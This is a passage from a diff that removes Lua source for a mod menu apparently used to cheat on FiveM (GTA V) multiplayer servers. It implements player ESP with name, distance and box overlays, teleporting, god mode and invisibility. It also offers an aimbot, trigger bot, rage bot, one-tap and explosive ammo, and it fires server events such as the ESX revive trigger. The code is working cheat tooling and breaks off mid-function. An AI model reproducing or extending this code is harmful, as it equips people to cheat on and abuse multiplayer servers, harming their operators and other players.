-                    FM:GetFunction("SetPedCoordsKeepVehicle")(FM:GetFunction("PlayerPedId")(), coords.x, coords.y, zPos + 0.0)
-                    break
-                end
-
-                Wait(5)
-            end
-
-            FM:AddNotification("SUCCESS", "Teleported to waypoint.")
-        end)
-    end
-
-    local esp_talk_col = FM.Tertiary
-
-    function FM:DoESP()
-        if not self.Config.Player.ESP then return end
-        local spot = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
-
-        if self.FreeCam and self.FreeCam.On and camX and camY and camZ then
-            spot = vector3(camX, camY, camZ)
-        elseif self.SpectatingPlayer and FM:GetFunction("DoesEntityExist")(FM:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then
-            spot = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("GetPlayerPed")(self.SpectatingPlayer, 0.0, 0.0, 0.0))
-        elseif self.RCCam and self.RCCam.On and rc_camX and rc_camY and rc_camZ then
-            spot = vector3(rc_camX, rc_camY, rc_camZ)
-        end
-
-        for id, src in dict.pairs(FM.PlayerCache) do
-            src = dict.tonumber(src)
-            local ped = FM:GetFunction("GetPlayerPed")(src)
-
-            if FM:GetFunction("DoesEntityExist")(ped) and ped ~= FM:GetFunction("PlayerPedId")() then
-                local _id = dict.tonumber(FM:GetFunction("GetPlayerServerId")(src))
-                local coords = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector_origin.x, vector_origin.y, vector_origin.z)
-                local dist = FM:GetFunction("GetDistanceBetweenCoords")(spot.x, spot.y, spot.z, coords.x, coords.y, coords.z)
-                local seat = dict.tonumber(FM:GetPedVehicleSeat(ped))
-
-                if seat ~= -2 then
-                    seat = seat + 0.25
-                end
-
-                if dist <= FM.Config.Player.ESPDistance then
-                    local pos_z = coords.z + 1.2
-
-                    if seat ~= -2 then
-                        pos_z = pos_z + seat
-                    end
-
-                    local _on_screen, _, _ = FM:GetFunction("GetScreenCoordFromWorldCoord")(coords.x, coords.y, pos_z)
-
-                    if _on_screen then
-                        if self.Config.Player.Box then
-                            self:DoBoxESP(src, ped)
-                        end
-
-                        if FM:GetFunction("NetworkIsPlayerTalking")(src) then
-                            self:Draw3DText(coords.x, coords.y, pos_z, _id .. " | " .. FM:CleanName(FM:GetFunction("GetPlayerName")(src), true) .. " [" .. dict.math.ceil(dist) .. "M" .. "]", esp_talk_col[1], esp_talk_col[2], esp_talk_col[3])
-                        else
-                            self:Draw3DText(coords.x, coords.y, pos_z, _id .. " | " .. FM:CleanName(FM:GetFunction("GetPlayerName")(src), true) .. " [" .. dict.math.ceil(dist) .. "M" .. "]", 255, 255, 255)
-                        end
-                    end
-                end
-            end
-        end
-    end
-
-    function FM:DoBoxESP(src, ped)
-        local r, g, b, a = 255, 255, 255, 255
-
-        if FM:GetFunction("NetworkIsPlayerTalking")(src) then
-            r, g, b = esp_talk_col[1], esp_talk_col[2], esp_talk_col[3]
-        end
-
-        local model = FM:GetFunction("GetEntityModel")(ped)
-        local min, max = FM:GetFunction("GetModelDimensions")(model)
-        local top_front_right = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, max)
-        local top_back_right = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(max.x, min.y, max.z))
-        local bottom_front_right = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(max.x, max.y, min.z))
-        local bottom_back_right = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(max.x, min.y, min.z))
-        local top_front_left = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(min.x, max.y, max.z))
-        local top_back_left = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(min.x, min.y, max.z))
-        local bottom_front_left = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(min.x, max.y, min.z))
-        local bottom_back_left = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, min)
-        -- LINES
-        -- RIGHT SIDE
-        FM:GetFunction("DrawLine")(top_front_right, top_back_right, r, g, b, a)
-        FM:GetFunction("DrawLine")(top_front_right, bottom_front_right, r, g, b, a)
-        FM:GetFunction("DrawLine")(bottom_front_right, bottom_back_right, r, g, b, a)
-        FM:GetFunction("DrawLine")(top_back_right, bottom_back_right, r, g, b, a)
-        -- LEFT SIDE
-        FM:GetFunction("DrawLine")(top_front_left, top_back_left, r, g, b, a)
-        FM:GetFunction("DrawLine")(top_back_left, bottom_back_left, r, g, b, a)
-        FM:GetFunction("DrawLine")(top_front_left, bottom_front_left, r, g, b, a)
-        FM:GetFunction("DrawLine")(bottom_front_left, bottom_back_left, r, g, b, a)
-        -- Connection
-        FM:GetFunction("DrawLine")(top_front_right, top_front_left, r, g, b, a)
-        FM:GetFunction("DrawLine")(top_back_right, top_back_left, r, g, b, a)
-        FM:GetFunction("DrawLine")(bottom_front_left, bottom_front_right, r, g, b, a)
-        FM:GetFunction("DrawLine")(bottom_back_left, bottom_back_right, r, g, b, a)
-    end
-
-    FM:AddCategory("Self", function(self, x, y, w, h)
-        local curY = 5
-
-        if self.Painter:CheckBox("GOD MODE", self.Config.Player.God, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "god_enabled") then
-            if FM.Config.SafeMode then
-                FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
-            else
-                self.Config.Player.God = not self.Config.Player.God
-                FM.ConfigClass.Save(true)
-            end
-        end
-
-        local _w = (self.Painter:GetTextWidth("TELEPORT TO COORDS", 4, 0.37)) + 2
-
-        if self.Painter:Button("TELEPORT TO COORDS", x, y, w - _w, curY, 200, 20, 255, 255, 255, 255, "teleport_to_coords") then
-            local x, y, z
-            _x = FM:GetTextInput("Enter X Coordinate.", 0, 15)
-
-            if _x and dict.tonumber(_x) then
-                x = _x
-            end
-
-            if x then
-                local _y = FM:GetTextInput("Enter Y Coordinate.", 0, 15)
-
-                if _y and dict.tonumber(_y) then
-                    y = _y
-                end
-            end
-
-            if x and y then
-                local _z = FM:GetTextInput("Enter Z Coordinate.", 0, 15)
-
-                if _z and dict.tonumber(_z) then
-                    z = _z
-                end
-            end
-
-            if x and y and z then
-                x = dict.tonumber(x) + 0.0
-                y = dict.tonumber(y) + 0.0
-                z = dict.tonumber(z) + 0.0
-                FM:GetFunction("SetEntityCoords")(FM:GetFunction("PlayerPedId")(), x, y, z)
-                FM:AddNotification("SUCCESS", "Teleported to coords.", 5000)
-            else
-                FM:AddNotification("INFO", "Cancelled.", 5000)
-            end
-        end
-
-        local _w = (self.Painter:GetTextWidth("TELEPORT TO WAYPOINT", 4, 0.37)) + 2
-
-        if self.Painter:Button("TELEPORT TO WAYPOINT", x, y, w - _w, curY + 25, 200, 20, 255, 255, 255, 255, "teleport_to_waypoint") then
-            FM:TeleportToWaypoint()
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("SEMI GOD MODE", self.Config.Player.SemiGod, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "semi_god_enabled") then
-            self.Config.Player.SemiGod = not self.Config.Player.SemiGod
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("ANTI AFK", self.Config.Player.AntiAFK, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "anti_afk") then
-            self.Config.Player.AntiAFK = not self.Config.Player.AntiAFK
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("INFINITE STAMINA", self.Config.Player.InfiniteStamina, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "infinite_stamina") then
-            self.Config.Player.InfiniteStamina = not self.Config.Player.InfiniteStamina
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("NO RAGDOLL", self.Config.Player.NoRagdoll, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "no_ragdoll_enabled") then
-            self.Config.Player.NoRagdoll = not self.Config.Player.NoRagdoll
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("INVISIBILITY", self.Config.Player.Invisibility, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "invisibility_enabled") then
-            self.Config.Player.Invisibility = not self.Config.Player.Invisibility
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("REVEAL INVISIBLE PLAYERS", self.Config.Player.RevealInvisibles, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "reveal_invis_players") then
-            self.Config.Player.RevealInvisibles = not self.Config.Player.RevealInvisibles
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("FAST RUN", self.Config.Player.FastRun, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "fast_af_runna_enabled") then
-            self.Config.Player.FastRun = not self.Config.Player.FastRun
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("SUPER JUMP", self.Config.Player.SuperJump, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "big_jump_enabled") then
-            self.Config.Player.SuperJump = not self.Config.Player.SuperJump
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("SUPER MAN", self.Config.Player.SuperMan, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "super_man_enabled") then
-            self.Config.Player.SuperMan = not self.Config.Player.SuperMan
-            FM.ConfigClass.Save(true)
-
-            if self.Config.Player.SuperMan then
-                FM:AddNotification("INFO", "Press ~y~SPACE~w~ to go up / ~y~W~w~ to go forward.")
-            end
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("MAGIC CARPET", self.Config.Player.MagicCarpet, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "magic_carpet_enabled") then
-            self.Config.Player.MagicCarpet = not self.Config.Player.MagicCarpet
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("FAKE DEAD", self.Config.Player.FakeDead, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "fake_dead") then
-            self.Config.Player.FakeDead = not self.Config.Player.FakeDead
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("FORCE RADAR", self.Config.Player.ForceRadar, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "force_radar") then
-            self.Config.Player.ForceRadar = not self.Config.Player.ForceRadar
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 20
-
-        if self.Painter:Button("HEAL", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "heal_option") then
-            FM:GetFunction("SetEntityHealth")(FM:GetFunction("PlayerPedId")(), 200)
-            FM:GetFunction("ClearPedBloodDamage")(FM:GetFunction("PlayerPedId")())
-            FM:AddNotification("INFO", "Healed.")
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("GIVE ARMOR", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "armor_option") then
-            FM:GetFunction("SetPedArmour")(FM:GetFunction("PlayerPedId")(), 200)
-            FM:AddNotification("INFO", "Armour given.")
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("SUICIDE", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "suicide_option") then
-            FM:GetFunction("SetEntityHealth")(FM:GetFunction("PlayerPedId")(), 0)
-            FM:AddNotification("INFO", "Killed.")
-        end
-
-        curY = curY + 25
-
-        if self.DynamicTriggers["esx_ambulancejob"] and self.DynamicTriggers["esx_ambulancejob"]["esx_ambulancejob:revive"] then
-            if self.Painter:Button("REVIVE ~g~ESX", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "esx_revive") then
-                FM:GetFunction("TriggerEvent")(self.DynamicTriggers["esx_ambulancejob"]["esx_ambulancejob:revive"])
-                FM:AddNotification("INFO", "Revived.")
-            end
-
-            curY = curY + 25
-        end
-
-        if self.Painter:Button("REVIVE", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "native_revive") then
-            FM:GetFunction("NetworkResurrectLocalPlayer")(FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0), FM:GetFunction("GetEntityHeading")(FM:GetFunction("PlayerPedId")()))
-            FM:AddNotification("INFO", "Revived.")
-        end
-    end)
-
-    FM:AddCategory("ESP", function(self, x, y)
-        local curY = 5
-
-        if self.Painter:CheckBox("ESP", self.Config.Player.ESP, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "esp_enabled") then
-            self.Config.Player.ESP = not self.Config.Player.ESP
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("BOX", self.Config.Player.Box, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "esp_box_enabled") then
-            self.Config.Player.Box = not self.Config.Player.Box
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("BLIPS", self.Config.Player.Blips, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "esp_blips_enabled") then
-            if self.Config.Player.Blips then
-                self:DoBlips(true)
-            end
-
-            self.Config.Player.Blips = not self.Config.Player.Blips
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("CROSSHAIR", self.Config.Player.CrossHair, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "crosshair_enabled") then
-            self.Config.Player.CrossHair = not self.Config.Player.CrossHair
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 20
-
-        if self.Painter:Button("ESP DRAW DISTANCE: " .. self.Config.Player.ESPDistance, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "set_aimbot_fov") then
-            local new = FM:GetTextInput("Enter ESP Draw Distance [35-50000]", self.Config.Player.ESPDistance, 7)
-            if not dict.tonumber(new) then return FM:AddNotification("ERROR", "Invalid distance.") end
-            if dict.tonumber(new) < 35 or dict.tonumber(new) > 50000 then return FM:AddNotification("ERROR", "Invalid distance.") end
-            self.Config.Player.ESPDistance = dict.tonumber(new) + 0.0
-            FM:AddNotification("SUCCESS", "ESP Draw Distance changed to " .. self.Config.Player.ESPDistance .. ".")
-            FM.ConfigClass.Save(true)
-        end
-    end)
-
-    local bone_check = {{31086, "SKEL_HEAD"}, {0, "SKEL_ROOT"}, {22711, "SKEL_L_Forearm"}, {28252, "SKEL_R_Forearm"}, {45509, "SKEL_L_UpperArm"}, {40269, "SKEL_R_UpperArm"}, {58271, "SKEL_L_Thigh"}, {51826, "SKEL_R_Thigh"}, {24816, "SKEL_Spine1"}, {24817, "SKEL_Spine2"}, {24818, "SKEL_Spine3"}, {14201, "SKEL_L_Foot"}, {52301, "SKEL_R_Foot"}}
-    local aimbot_bones = {"SKEL_HEAD", "SKEL_ROOT", "SKEL_L_Forearm", "SKEL_R_Forearm", "SKEL_L_UpperArm", "SKEL_R_UpperArm", "SKEL_L_Thigh", "SKEL_R_Thigh", "SKEL_Spine1", "SKEL_Spine2", "SKEL_Spine3", "SKEL_L_Foot", "SKEL_R_Foot"}
-
-    FM:AddCategory("Combat", function(self, x, y, w, h)
-        local curY = 5
-
-        if self.Painter:CheckBox("TRIGGER BOT", self.Config.Player.TriggerBot, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "trigger_bot_enabled") then
-            self.Config.Player.TriggerBot = not self.Config.Player.TriggerBot
-            FM.ConfigClass.Save(true)
-        end
-
-        local _w = (self.Painter:GetTextWidth("ANTI AIM", 4, 0.35)) + 20
-
-        if self.Painter:CheckBox("ANTI AIM", self.Config.Player.AntiAim, x, y, w - _w - 10, curY, 200, 20, 255, 255, 255, 255, "anti_aim_enabled") then
-            self.Config.Player.AntiAim = not self.Config.Player.AntiAim
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("TRIGGER BOT NEEDS LOS", self.Config.Player.TriggerBotNeedsLOS, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "triggerbot_need_los_enabled") then
-            self.Config.Player.TriggerBotNeedsLOS = not self.Config.Player.TriggerBotNeedsLOS
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("AIMBOT", self.Config.Player.Aimbot, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "aimbot_enabled") then
-            self.Config.Player.Aimbot = not self.Config.Player.Aimbot
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("AIMBOT NEEDS LOS", self.Config.Player.AimbotNeedsLOS, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "aimbot_need_los_enabled") then
-            self.Config.Player.AimbotNeedsLOS = not self.Config.Player.AimbotNeedsLOS
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("TP TO AIMBOT TARGET", self.Config.Player.TPAimbot, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "tpaimbot_enabled") then
-            self.Config.Player.TPAimbot = not self.Config.Player.TPAimbot
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("DRAW AIMBOT FOV", self.Config.Player.AimbotDrawFOV, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "draw_aimbot_fov") then
-            self.Config.Player.AimbotDrawFOV = not self.Config.Player.AimbotDrawFOV
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("ONLY TARGET PLAYERS", self.Config.Player.OnlyTargetPlayers, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "only_target_players") then
-            self.Config.Player.OnlyTargetPlayers = not self.Config.Player.OnlyTargetPlayers
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("TRIGGER BOT TARGET VEHICLES", self.Config.Player.TargetInsideVehicles, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "target_inside_vehicles") then
-            self.Config.Player.TargetInsideVehicles = not self.Config.Player.TargetInsideVehicles
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("INFINITE COMBAT ROLL", self.Config.Player.InfiniteCombatRoll, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "infinite_combat_roll") then
-            self.Config.Player.InfiniteCombatRoll = not self.Config.Player.InfiniteCombatRoll
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("~r~RAGE ~w~BOT", self.Config.Player.RageBot, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "rage_bot") then
-            self.Config.Player.RageBot = not self.Config.Player.RageBot
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("NO BULLET DROP", self.Config.Player.NoDrop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "no_bullet_drop") then
-            self.Config.Player.NoDrop = not self.Config.Player.NoDrop
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("NO RELOAD", self.Config.Player.NoReload, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "no_reload") then
-            self.Config.Player.NoReload = not self.Config.Player.NoReload
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("INFINITE AMMO", self.Config.Player.InfiniteAmmo, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "infinite_ammo") then
-            self.Config.Player.InfiniteAmmo = not self.Config.Player.InfiniteAmmo
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("RAPID FIRE", self.Config.Player.RapidFire, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "rapid_fire") then
-            self.Config.Player.RapidFire = not self.Config.Player.RapidFire
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("EXPLOSIVE AMMO", self.Config.Player.ExplosiveAmmo, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "explosive_ammo") then
-            self.Config.Player.ExplosiveAmmo = not self.Config.Player.ExplosiveAmmo
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("ONE TAP", self.Config.Player.OneTap, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "one_tap_enabled") then
-            if FM.Config.SafeMode then
-                FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
-            else
-                self.Config.Player.OneTap = not self.Config.Player.OneTap
-                FM.ConfigClass.Save(true)
-            end
-        end
-
-        curY = curY + 20
-
-        if self.Painter:ListChoice("AIMBOT BONE: ", aimbot_bones, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "aimbot_bone") then
-            self.Config.Player.AimbotBone = list_choices["aimbot_bone"].selected
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("AIMBOT FOV: " .. self.Config.Player.AimbotFOV, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "set_aimbot_fov") then
-            local new = FM:GetTextInput("Enter Aimbot FOV [35-500]", self.Config.Player.AimbotFOV, 7)
-            if not dict.tonumber(new) then return FM:AddNotification("ERROR", "Invalid FOV.") end
-            if dict.tonumber(new) < 35 or dict.tonumber(new) > 500 then return FM:AddNotification("ERROR", "Invalid FOV.") end
-            self.Config.Player.AimbotFOV = dict.tonumber(new) + 0.0
-            FM:AddNotification("SUCCESS", "Aimbot FOV changed to " .. self.Config.Player.AimbotFOV .. ".")
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("TRIGGER BOT DISTANCE: " .. self.Config.Player.TriggerBotDistance, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "set_trigger_bot_distance") then
-            local new = FM:GetTextInput("Enter Trigger Bot Distance [10-10000]", self.Config.Player.TriggerBotDistance, 7)
-            if not dict.tonumber(new) then return FM:AddNotification("ERROR", "Invalid distance.") end
-            if dict.tonumber(new) < 10 or dict.tonumber(new) > 10000 then return FM:AddNotification("ERROR", "Invalid distance.") end
-            self.Config.Player.TriggerBotDistance = dict.tonumber(new) + 0.0
-            FM:AddNotification("SUCCESS", "Trigger Bot distance changed to " .. self.Config.Player.TriggerBotDistance .. ".")
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("TP AIMBOT THRESHOLD: " .. self.Config.Player.TPAimbotThreshold, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "set_tp_aimbot_threshold") then
-            local new = FM:GetTextInput("Enter TP Aimbot Distance [10-1000]", self.Config.Player.TPAimbotThreshold, 7)
-            if not dict.tonumber(new) then return FM:AddNotification("ERROR", "Invalid distance.") end
-            if dict.tonumber(new) < 10 or dict.tonumber(new) > 1000 then return FM:AddNotification("ERROR", "Invalid distance.") end
-            self.Config.Player.TPAimbotThreshold = dict.tonumber(new) + 0.0
-            FM:AddNotification("SUCCESS", "TP Aimbot threshold changed to " .. self.Config.Player.TPAimbotThreshold .. ".")
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("TP AIMBOT DISTANCE: " .. self.Config.Player.TPAimbotDistance, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "set_tp_aimbot_distance") then
-            local new = FM:GetTextInput("Enter TP Aimbot Distance [0-10]", self.Config.Player.TPAimbotDistance, 7)
-            if not dict.tonumber(new) then return FM:AddNotification("ERROR", "Invalid distance.") end
-            if dict.tonumber(new) < 0 or dict.tonumber(new) > 10 then return FM:AddNotification("ERROR", "Invalid distance.") end
-            self.Config.Player.TPAimbotDistance = dict.tonumber(new) + 0.0
-            FM:AddNotification("SUCCESS", "TP Aimbot distance changed to " .. self.Config.Player.TPAimbotDistance .. ".")
-            FM.ConfigClass.Save(true)
-        end
-    end)
-
-    local function _is_ped_player(ped)
-        local id = FM:GetFunction("NetworkGetPlayerIndexFromPed")(ped)
-
-        return id and id > 0
-    end
-
-    local function rot_to_dir(rot)
-        local radZ = rot.z * 0.0174532924
-        local radX = rot.x * 0.0174532924
-        local num = dict.math.abs(dict.math.cos(radX))
-        local dir = vector3(-dict.math.sin(radZ) * num, dict.math.cos(radZ) * num, radX)
-
-        return dir
-    end
-
-    local function _multiply(vector, mult)
-        return vector3(vector.x * mult, vector.y * mult, vector.z * mult)
-    end
-
-    local function _get_ped_hovered_over()
-        local cur = FM:GetFunction("GetGameplayCamCoord")()
-        local _dir = FM:GetFunction("GetGameplayCamRot")(0)
-        local dir = rot_to_dir(_dir)
-        local len = _multiply(dir, FM.Config.Player.TriggerBotDistance)
-        local targ = cur + len
-        local handle = FM:GetFunction("StartShapeTestRay")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, -1)
-        local _, hit, hit_pos, _, entity = FM:GetFunction("GetShapeTestResult")(handle)
-        local force
-        local _seat
-
-        if FM:GetFunction("DoesEntityExist")(entity) and FM:GetFunction("IsEntityAVehicle")(entity) and FM.Config.Player.TargetInsideVehicles and FM:GetFunction("HasEntityClearLosToEntityInFront")(FM:GetFunction("PlayerPedId")(), entity) then
-            local driver = FM:GetFunction("GetPedInVehicleSeat")(entity, -1)
-
-            if FM:GetFunction("DoesEntityExist")(driver) and not FM:GetFunction("IsPedDeadOrDying")(driver) then
-                entity = driver
-                force = true
-                _seat = -1
-            else
-                local _dist = dict.math.huge
-                local _ped
-
-                for i = -2, FM:GetFunction("GetVehicleMaxNumberOfPassengers")(vehicle) do
-                    local who = FM:GetFunction("GetPedInVehicleSeat")(entity, i)
-
-                    if FM:GetFunction("DoesEntityExist")(who) and FM:GetFunction("IsEntityAPed")(who) and not FM:GetFunction("IsPedDeadOrDying")(who) then
-                        local s_pos = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(who, 0.0, 0.0, 0.0)
-                        local s_dist = FM:GetFunction("GetDistanceBetweenCoords")(hit_pos.x, hit_pos.y, hit_pos.z, s_pos.x, s_pos.y, s_pos.z, true)
-
-                        if s_dist < _dist then
-                            _dist = s_dist
-                            _ped = who
-                            _seat = i
-                        end
-                    end
-                end
-
-                if FM:GetFunction("DoesEntityExist")(_ped) and FM:GetFunction("IsEntityAPed")(_ped) then
-                    entity = _ped
-                    force = true
-                end
-            end
-        end
-
-        if hit and FM:GetFunction("DoesEntityExist")(entity) and FM:GetFunction("DoesEntityHaveDrawable")(entity) and FM:GetFunction("IsEntityAPed")(entity) and (force or FM:GetFunction("HasEntityClearLosToEntityInFront")(FM:GetFunction("PlayerPedId")(), entity)) then return true, entity, _seat end
-
-        return nil, false, nil
-    end
-
-    local _aimbot_poly = {}
-
-    local function _within_poly(point, poly)
-        local inside = false
-        local j = #poly
-
-        for i = 1, #poly do
-            if (poly[i].y < point.y and poly[j].y >= point.y or poly[j].y < point.y and poly[i].y >= point.y) and (poly[i].x + (point.y - poly[i].y) / (poly[j].y - poly[i].y) * (poly[j].x - poly[i].x) < point.x) then
-                inside = not inside
-            end
-
-            j = i
-        end
-
-        return inside
-    end
-
-    local function _is_ped_in_aimbot_fov(ped)
-        local pos = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
-        local showing, sx, sy = FM:GetFunction("GetScreenCoordFromWorldCoord")(pos.x, pos.y, pos.z)
-        if not showing then return false end
-
-        return _within_poly({
-            x = sx,
-            y = sy
-        }, _aimbot_poly.points)
-    end
-
-    local function _get_ped_in_aimbot_fov()
-        local fov = FM.Config.Player.AimbotFOV
-        local closest = dict.math.huge
-        local selected
-
-        for ped in FM:EnumeratePeds() do
-            if not FM:IsFriend(ped) and (not FM.Config.Player.OnlyTargetPlayers or _is_ped_player(ped)) then
-                local pos = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
-                local showing, sx, sy = FM:GetFunction("GetScreenCoordFromWorldCoord")(pos.x, pos.y, pos.z)
-
-                if ped ~= FM:GetFunction("PlayerPedId")() and showing and (not FM.Config.Player.AimbotNeedsLOS or FM:GetFunction("HasEntityClearLosToEntityInFront")(FM:GetFunction("PlayerPedId")(), ped)) then
-                    local in_fov = _is_ped_in_aimbot_fov(ped)
-                    local us = FM:GetFunction("GetGameplayCamCoord")()
-                    local dist = FM:GetFunction("GetDistanceBetweenCoords")(pos.x, pos.y, pos.z, us.x, us.y, us.z)
-
-                    if in_fov and dist < closest then
-                        dist = closest
-                        selected = ped
-                    end
-                end
-            end
-        end
-
-        if selected and (not FM:GetFunction("DoesEntityExist")(FM.Config.Player.AimbotTarget) or FM:GetFunction("IsEntityDead")(FM.Config.Player.AimbotTarget)) and not FM:IsFriend(selected) and FM:GetFunction("HasEntityClearLosToEntity")(FM:GetFunction("PlayerPedId")(), selected) then
-            FM.Config.Player.AimbotTarget = selected
-        end
-
-        local _ped = _get_ped_hovered_over()
-
-        if not FM.Config.Player.AimbotTarget and FM:GetFunction("DoesEntityExist")(_ped) and not FM:IsFriend(_ped) and (not FM.Config.Player.OnlyTargetPlayers or _is_ped_player(_ped)) then
-            local pos = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(_ped, 0.0, 0.0, 0.0)
-            local showing, sx, sy = FM:GetFunction("GetScreenCoordFromWorldCoord")(pos.x, pos.y, pos.z)
-
-            -- and FM:GetFunction("HasEntityClearLosToEntityInFront")(FM:GetFunction("PlayerPedId")(), ped) then
-            if _ped ~= FM:GetFunction("PlayerPedId")() and showing and (not FM.Config.Player.AimbotNeedsLOS or FM:GetFunction("HasEntityClearLosToEntityInFront")(FM:GetFunction("PlayerPedId")(), ped)) then
